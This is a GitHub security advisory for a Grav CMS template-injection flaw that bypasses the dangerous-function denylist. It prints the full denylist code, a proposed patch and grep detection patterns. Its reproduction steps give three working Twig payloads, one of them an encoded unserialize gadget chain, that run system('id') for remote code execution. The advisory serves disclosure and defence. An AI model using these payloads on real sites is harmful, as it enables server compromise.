# [H] Grav Server-side Template Injection (SSTI) via Denylist Bypass Vulnerability

## Summary
Severity: High
Advisory: GHSA-j3v8-v77f-fvgm
CVE: CVE-2023-34253
CWE: CWE-1336, CWE-94
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2023-06-16
Source: https://github.com/advisories/GHSA-j3v8-v77f-fvgm
Type: github-advisory

## Affected
- Packagist: `getgrav/grav` — affected >=0 <1.7.42

## Details
Hi, 

actually we have sent the bug report to security@getgrav.org on 27th March 2023 and on 10th April 2023.

# Grav Server-side Template Injection (SSTI) via Denylist Bypass Vulnerability

## Summary:  
| **Product**             | Grav CMS                                      |
| ----------------------- | --------------------------------------------- |
| **Vendor**              | Grav                                          |
| **Severity**            | High - Users with login access to Grav Admin panel and page creation/update permissions are able to obtain remote code/command execution |
| **Affected Versions**   | <= [v1.7.40](https://github.com/getgrav/grav/tree/1.7.40) (Commit [685d762](https://github.com/getgrav/grav/commit/685d76231a057416651ed192a6a2e83720800e61)) (Latest version as of writing) |
| **Tested Versions**     | v1.7.40                                       |
| **Internal Identifier** | STAR-2023-0006                                |
| **CVE Identifier**      | Reserved CVE-2023-30592, CVE-2023-30593, CVE-2023-30594                                           |
| **CWE(s)**              | CWE-184: Incomplete List of Disallowed Inputs, CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine |

## CVSS3.1 Scoring System:  
**Base Score:** 7.2 (High)  
**Vector String:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`  
| **Metric**                   | **Value** |
| ---------------------------- | --------- |
| **Attack Vector (AV)**       | Network   |
| **Attack Complexity (AC)**   | Low       |
| **Privileges Required (PR)** | High      |
| **User Interaction (UI)**    | None      |
| **Scope (S)**                | Unchanged |
| **Confidentiality \(C)**     | High      |
| **Integrity (I)**            | High      |
| **Availability (A)**         | High      |

## Product Overview:  
Grav is a PHP-based flat-file content management system (CMS) designed to provide a fast and simple way to build websites. It supports rendering of web pages written in Markdown and Twig expressions, and provides an administration panel to manage the entire website via an optional Admin plugin.

## Vulnerability Summary:  
The denylist introduced in commit [9d6a2d](https://www.github.com/getgrav/grav/commit/9d6a2dba09fd4e56f5cdfb9a399caea355bfeb83) to prevent dangerous functions from being executed via injection of malicious templates was insufficient and could be easily subverted in multiple ways -- (1) using unsafe functions that are not banned, (2) using capitalised callable names, and (3) using fully-qualified names for referencing callables. Consequently, a low privileged attacker with login access to Grav Admin panel and page creation/update permissions is able to inject malicious templates to obtain remote code execution.

## Vulnerability Details:  
In addressing [CVE-2022-2073](https://huntr.dev/bounties/3ef640e6-9e25-4ecb-8ec1-64311d63fe66/), a denylist was introduced in commit [9d6a2d](https://www.github.com/getgrav/grav/commit/9d6a2dba09fd4e56f5cdfb9a399caea355bfeb83) to validate and ensure that dangerous functions could not be executed via injection of malicious templates.

The implementation of the denylist can be found in `Utils::isDangerousFunction()` within [/system/src/Grav/Common/Utils.php](https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Utils.php#L1952-L2190):
~~~php
    /**
     * @param string $name
     * @return bool
     */
    public static function isDangerousFunction(string $name): bool
    {
        static $commandExecutionFunctions = [
            'exec',
            'passthru',
            'system',
            'shell_exec',
            'popen',
            'proc_open',
            'pcntl_exec',
        ];

        static $codeExecutionFunctions = [
            'assert',
            'preg_replace',
            'create_function',
            'include',
            'include_once',
            'require',
            'require_once'
        ];

        static $callbackFunctions = [
            'ob_start' => 0,
            'array_diff_uassoc' => -1,
            'array_diff_ukey' => -1,
            'array_filter' => 1,
            'array_intersect_uassoc' => -1,
            'array_intersect_ukey' => -1,
            'array_map' => 0,
            'array_reduce' => 1,
            'array_udiff_assoc' => -1,
            'array_udiff_uassoc' => [-1, -2],
            'array_udiff' => -1,
            'array_uintersect_assoc' => -1,
            'array_uintersect_uassoc' => [-1, -2],
            'array_uintersect' => -1,
            'array_walk_recursive' => 1,
            'array_walk' => 1,
            'assert_options' => 1,
            'uasort' => 1,
            'uksort' => 1,
            'usort' => 1,
            'preg_replace_callback' => 1,
            'spl_autoload_register' => 0,
            'iterator_apply' => 1,
            'call_user_func' => 0,
            'call_user_func_array' => 0,
            'register_shutdown_function' => 0,
            'register_tick_function' => 0,
            'set_error_handler' => 0,
            'set_exception_handler' => 0,
            'session_set_save_handler' => [0, 1, 2, 3, 4, 5],
            'sqlite_create_aggregate' => [2, 3],
            'sqlite_create_function' => 2,
        ];

        static $informationDiscosureFunctions = [
            'phpinfo',
            'posix_mkfifo',
            'posix_getlogin',
            'posix_ttyname',
            'getenv',
            'get_current_user',
            'proc_get_status',
            'get_cfg_var',
            'disk_free_space',
            'disk_total_space',
            'diskfreespace',
            'getcwd',
            'getlastmo',
            'getmygid',
            'getmyinode',
            'getmypid',
            'getmyuid'
        ];

        static $otherFunctions = [
            'extract',
            'parse_str',
            'putenv',
            'ini_set',
            'mail',
            'header',
            'proc_nice',
            'proc_terminate',
            'proc_close',
            'pfsockopen',
            'fsockopen',
            'apache_child_terminate',
            'posix_kill',
            'posix_mkfifo',
            'posix_setpgid',
            'posix_setsid',
            'posix_setuid',
        ];

        if (in_array($name, $commandExecutionFunctions)) {
            return true;
        }

        if (in_array($name, $codeExecutionFunctions)) {
            return true;
        }

        if (isset($callbackFunctions[$name])) {
            return true;
        }

        if (in_array($name, $informationDiscosureFunctions)) {
            return true;
        }

        if (in_array($name, $otherFunctions)) {
            return true;
        }

        return static::isFilesystemFunction($name);
    }

    /**
     * @param string $name
     * @return bool
     */
    public static function isFilesystemFunction(string $name): bool
    {
        static $fileWriteFunctions = [
            'fopen',
            'tmpfile',
            'bzopen',
            'gzopen',
            // write to filesystem (partially in combination with reading)
            'chgrp',
            'chmod',
            'chown',
            'copy',
            'file_put_contents',
            'lchgrp',
            'lchown',
            'link',
            'mkdir',
            'move_uploaded_file',
            'rename',
            'rmdir',
            'symlink',
            'tempnam',
            'touch',
            'unlink',
            'imagepng',
            'imagewbmp',
            'image2wbmp',
            'imagejpeg',
            'imagexbm',
            'imagegif',
            'imagegd',
            'imagegd2',
            'iptcembed',
            'ftp_get',
            'ftp_nb_get',
        ];

        static $fileContentFunctions = [
            'file_get_contents',
            'file',
            'filegroup',
            'fileinode',
            'fileowner',
            'fileperms',
            'glob',
            'is_executable',
            'is_uploaded_file',
            'parse_ini_file',
            'readfile',
            'readlink',
            'realpath',
            'gzfile',
            'readgzfile',
            'stat',
            'imagecreatefromgif',
            'imagecreatefromjpeg',
            'imagecreatefrompng',
            'imagecreatefromwbmp',
            'imagecreatefromxbm',
            'imagecreatefromxpm',
            'ftp_put',
            'ftp_nb_put',
            'hash_update_file',
            'highlight_file',
            'show_source',
            'php_strip_whitespace',
        ];

        static $filesystemFunctions = [
            // read from filesystem
            'file_exists',
            'fileatime',
            'filectime',
            'filemtime',
            'filesize',
            'filetype',
            'is_dir',
            'is_file',
            'is_link',
            'is_readable',
            'is_writable',
            'is_writeable',
            'linkinfo',
            'lstat',
            //'pathinfo',
            'getimagesize',
            'exif_read_data',
            'read_exif_data',
            'exif_thumbnail',
            'exif_imagetype',
            'hash_file',
            'hash_hmac_file',
            'md5_file',
            'sha1_file',
            'get_meta_tags',
        ];

        if (in_array($name, $fileWriteFunctions)) {
            return true;
        }

        if (in_array($name, $fileContentFunctions)) {
            return true;
        }

        if (in_array($name, $filesystemFunctions)) {
            return true;
        }

        return false;
    }
~~~

The list of banned functions appears to be adapted from a [StackOverflow post](https://stackoverflow.com/a/3697776). While the denylist looks rather comprehensive, there are actually multiple issues with the denylist implementation:
1. There may be unsafe functions, be it built-in to PHP or user-defined, which are not be blocked. For example, `unserialize()` and aliases of blocked functions, such as `ini_alter()`, are not being included in the denylist.  
2. A case-sensitive comparison is performed against the denylist, but PHP function names are case-insensitive. This allows using `filter('SYSTEM')` to trivially bypass the denylist validation check.  
3. Fully qualified names can be used when referencing functions, allowing `filter('\system')` to trivially bypass the denylist validation checks.  

## Exploit Conditions:    
This vulnerability can be exploited if the attacker has access to:
1. an administrator account, or
2. a non-administrative user account with the following permissions granted:
    - login access to Grav admin panel, and
    - page creation or update rights

## Reproduction Steps:  
1. Log in to Grav Admin using an administrator account.
2. Navigate to `Accounts > Add`, and ensure that the following permissions are assigned when creating a new low-privileged user:
    * Login to Admin - Allowed
    * Page Update - Allowed
3. Log out of Grav Admin, and log back in using the account created in step 2.
4. Navigate to `http://<grav_installation>/admin/pages/home`.
5. Click the `Advanced` tab and select the checkbox beside `Twig` to ensure that Twig processing is enabled for the modified webpage.
6. Under the `Content` tab, insert the following payload within the editor:
   ~~~twig
   // Method 1: Using unserialize() to trigger system('id') call
   // Serialized payloaed generated using the phpggc tool: ./phpggc -b Monolog/RCE7 system 'id'
   // {{ 'TzozNzoiTW9ub2xvZ1xIYW5kbGVyXEZpbmdlcnNDcm9zc2VkSGFuZGxlciI6NDp7czoxNjoiACoAcGFzc3RocnVMZXZlbCI7aTowO3M6MTA6IgAqAGhhbmRsZXIiO3I6MTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntpOjA7czoyOiJpZCI7czo1OiJsZXZlbCI7aTowO319czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czozOiJwb3MiO2k6MTtzOjY6InN5c3RlbSI7fX0=' | base64_decode | array | filter('unserialize') }}
   
   // Method 2: Trigger system('id') via case-insensitive function names
   {{ ['id'] | filter('System') }}
   
   // Method 3: Trigger system('id') via fully qualified names when referencing functions
   {{ ['id'] | filter('\\system') }}
   ~~~   
7. Click the Preview button. Observe that the output of the `id` shell command is returned in the preview.

## Suggested Mitigations:  
It is recommended to review the list of functions, both default functions in PHP and user-defined functions, and include missing unsafe functions in the denylist. A non-exhaustive list of missing unsafe functions discovered is shown below:
- `unserialize()`
- `ini_alter()`
- `simplexml_load_file()`
- `simplexml_load_string()`
- `forward_static_call()`
- `forward_static_call_array()`

The `Utils::isDangerousFunction()` function in [/system/src/Grav/Common/Utils.php](https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Utils.php#L1956-L2074) should also be patched to disallow usage of fully qualified names when specifying callables, as well as ensure that validation performed on the `$name` parameter is case-insensitive.

For example,
~~~diff php
...
abstract class Utils
{
    ...
    /**
     * @param string $name
     * @return bool
     */
    public static function isDangerousFunction(string $name): bool
    {
        ...
+       if ($arrow instanceof Closure) {
+           return false;
+       }

+       $name = strtolower($name);
+       if (strpos($name, "\\") !== false) {
+           return false;
+       }

        if (in_array($name, $commandExecutionFunctions)) {
            return true;
        }

        if (in_array($name, $codeExecutionFunctions)) {
            return true;
        }

        if (isset($callbackFunctions[$name])) {
            return true;
        }

        if (in_array($name, $informationDiscosureFunctions)) {
            return true;
        }

        if (in_array($name, $otherFunctions)) {
            return true;
        }

        return static::isFilesystemFunction($name);
    }
    ...
}
~~~

End users should also ensure that `twig.undefined_functions` and `twig.undefined_filters` properties in `/path/to/webroot/system/config/system.yaml` configuration file are set to `false` to disallow Twig from treating undefined filters/functions as PHP functions and executing them.

## Detection Guidance:  
The following strategies may be used to detect potential exploitation attempts.
1. Searching within Markdown pages using the following shell command:  
   `grep -Priz -e '(ini_alter|unserialize|simplexml_load_file|simplexml_load_string|forward_static_call|forward_static_call_array|\|\s*(filter|map|reduce))\s*\(' /path/to/webroot/user/pages/`
2. Searching within Doctrine cache data using the following shell command:  
   `grep -Priz -e '(ini_alter|unserialize|simplexml_load_file|simplexml_load_string|forward_static_call|forward_static_call_array|\|\s*(filter|map|reduce))\s*\(' --include '*.doctrinecache.data' /path/to/webroot/cache/`
3. Searching within Twig cache using the following shell command: 
   `grep -Priz -e '(ini_alter|unserialize|simplexml_load_file|simplexml_load_string|forward_static_call|forward_static_call_array|twig_array_(filter|map|reduce))\s*\(' /path/to/webroot/cache/twig/`
4. Searching within compiled Twig template files using the following shell command:  
   `grep -Priz -e '(ini_alter|unserialize|simplexml_load_file|simplexml_load_string|forward_static_call|forward_static_call_array|\|\s*(filter|map|reduce))\s*\(' /path/to/webroot/cache/compiled/files/`

Note that it is not possible to detect indicators of compromise reliably using the Grav log file (located at `/path/to/webroot/logs/grav.log` by default), as successful exploitation attempts do not generate any additional logs. However, it is worthwhile to examine any PHP errors or warnings logged to determine the existence of any failed exploitation attempts.

## Credits:  
Ngo Wei Lin ([@Creastery](https://twitter.com/Creastery)) & Wang Hengyue ([@w_hy_04](https://twitter.com/w_hy_04)) of STAR Labs SG Pte. Ltd. ([@starlabs_sg](https://twitter.com/starlabs_sg))

The scheduled disclosure date is _**25th July, 2023**_. Disclosure at an earlier date is also possible if agreed upon by all parties.  

Kindly note that STAR Labs reserved and assigned the following CVE identifiers to the respective vulnerabilities presented in this report:  
1. **CVE-2023-30592**
    Server-side Template Injection (SSTI) in getgrav/grav <= v1.7.40 allows Grav Admin users with page creation or update rights to bypass the dangerous functions denylist check in `Utils::isDangerousFunction()` and to achieve remote code execution via usage of unsafe functions, such as `unserialize()`, that are not blocked. This is a bypass of CVE-2022-2073.
2. **CVE-2023-30593**
    Server-side Template Injection (SSTI) in getgrav/grav <= v1.7.40 allows Grav Admin users with page creation or update rights to bypass the dangerous functions denylist check in `Utils::isDangerousFunction()` and to achieve remote code execution via usage of capitalised names, supplied as strings, when referencing callables. This is a bypass of CVE-2022-2073.
3. **CVE-2023-30594**
    Server-side Template Injection (SSTI) in getgrav/grav <= v1.7.40 allows Grav Admin users with page creation or update rights to bypass the dangerous functions denylist check in `Utils::isDangerousFunction()` and to achieve remote code execution via usage of fully-qualified names, supplied as strings, when referencing callables. This is a bypass of CVE-2022-2073.

## References
- https://github.com/getgrav/grav/security/advisories/GHSA-j3v8-v77f-fvgm
- https://nvd.nist.gov/vuln/detail/CVE-2023-34253
- https://github.com/getgrav/grav/commit/244758d4383034fe4cd292d41e477177870b65ec
- https://github.com/getgrav/grav/commit/71bbed12f950de8335006d7f91112263d8504f1b
- https://github.com/getgrav/grav/commit/8c2c1cb72611a399f13423fc6d0e1d998c03e5c8
- https://github.com/getgrav/grav/commit/9d01140a63c77075ef09b26ef57cf186138151a5
- https://github.com/getgrav/grav
- https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Utils.php#L1952-L2190
- https://huntr.dev/bounties/3ef640e6-9e25-4ecb-8ec1-64311d63fe66
- https://www.github.com/getgrav/grav/commit/9d6a2dba09fd4e56f5cdfb9a399caea355bfeb83
